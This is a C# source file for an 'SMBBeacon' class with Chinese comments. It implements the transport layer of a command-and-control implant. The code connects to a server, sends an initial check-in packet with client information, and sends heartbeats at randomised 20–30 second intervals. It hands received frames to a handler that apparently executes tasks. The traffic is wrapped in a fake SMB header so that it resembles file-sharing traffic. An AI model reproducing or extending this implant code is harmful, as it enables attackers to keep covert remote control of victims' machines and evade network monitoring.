using Beacon.Helper;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;

namespace Beacon
{
    internal class SMBBeacon
    {
        private TcpClient _tcpClient;
        private IPEndPoint _serverEp;
        private volatile bool _running;
        private Thread _recvThread;
        private System.Timers.Timer _heartbeatTimer;
        private readonly object _sendLock = new object();

        public bool Start(string serverIp, int serverPort)
        {
            try
            {
                Stop();
                _tcpClient = new TcpClient();
                _serverEp = new IPEndPoint(IPAddress.Parse(serverIp), serverPort);
                _running = true;
                _recvThread = new Thread(ReceiveLoop) { IsBackground = true };
                _recvThread.Start();

                // 发送初始上线包
                SendSMBRequest(BeaconHandle.BuildClientInfo());

                // 定时心跳
                _heartbeatTimer = new System.Timers.Timer(new Random().Next(20000, 30000));
                _heartbeatTimer.AutoReset = true;
                _heartbeatTimer.Elapsed += (_, __) =>
                {
                    try { BeaconHandle.KeepAlive(SendSMBRequest); } catch { }
                };
                _heartbeatTimer.Start();
                return true;
            }
            catch
            {
                Stop();
                return false;
            }
        }

        public void Stop()
        {
            try { _heartbeatTimer?.Stop(); } catch { }
            try { _heartbeatTimer?.Dispose(); } catch { }
            _running = false;
            try { _tcpClient?.Close(); } catch { }
            try { _recvThread?.Join(200); } catch { }
        }

        private void SendSMBRequest(byte[] data)
        {
            if (_tcpClient == null || _serverEp == null) return;
            try
            {
                // 构造SMB请求包
                var packet = BuildSMBRequest(data);
                lock (_sendLock)
                {
                    if (_tcpClient.Connected)
                    {
                        var stream = _tcpClient.GetStream();
                        stream.Write(packet, 0, packet.Length);
                        stream.Flush();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SMBBeacon] 发送失败: {ex.Message}");
            }
        }

        private byte[] BuildSMBRequest(byte[] data)
        {
            // 构造SMB请求包
            var packet = new byte[64 + data.Length]; // SMB头部 + 数据
            
            // SMB头部
            packet[0] = 0xFF; // SMB标识符
            packet[1] = (byte)'S';
            packet[2] = (byte)'M';
            packet[3] = (byte)'B';
            
            // 其他SMB头部字段...
            // 这里简化实现，实际需要完整的SMB协议支持
            
            // 添加数据
            Array.Copy(data, 0, packet, 64, data.Length);
            
            return packet;
        }

        private void ReceiveLoop()
        {
            while (_running)
            {
                try
                {
                    if (_tcpClient == null || _serverEp == null) break;
                    
                    if (!_tcpClient.Connected)
                    {
                        _tcpClient.Connect(_serverEp);
                    }
                    
                    var stream = _tcpClient.GetStream();
                    var buffer = new byte[4096];
                    var bytesRead = stream.Read(buffer, 0, buffer.Length);
                    
                    if (bytesRead > 0)
                    {
                        var data = new byte[bytesRead];
                        Array.Copy(buffer, 0, data, 0, bytesRead);
                        
                        // 解析SMB响应，提取数据
                        if (IsSMBPacket(data))
                        {
                            var extractedData = ExtractSMBData(data);
                            if (extractedData.Length > 0)
                            {
                                BeaconHandle.OnFrame(SendSMBRequest, extractedData);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[SMBBeacon] 接收失败: {ex.Message}");
                    Thread.Sleep(1000); // 重连延迟
                }
            }
        }

        private bool IsSMBPacket(byte[] data)
        {
            // 检查SMB协议标识符 (0xFF, 'S', 'M', 'B')
            if (data.Length < 4) return false;
            return data[0] == 0xFF && data[1] == (byte)'S' && data[2] == (byte)'M' && data[3] == (byte)'B';
        }

        private byte[] ExtractSMBData(byte[] smbPacket)
        {
            try
            {
                // 简化的SMB数据提取
                if (smbPacket.Length < 64) return new byte[0]; // SMB头部至少64字节
                
                // 跳过SMB头部，提取数据部分
                var dataLength = smbPacket.Length - 64;
                if (dataLength <= 0) return new byte[0];
                
                var extractedData = new byte[dataLength];
                Array.Copy(smbPacket, 64, extractedData, 0, dataLength);
                
                return extractedData;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SMBBeacon] 数据提取失败: {ex.Message}");
                return new byte[0];
            }
        }
    }
}
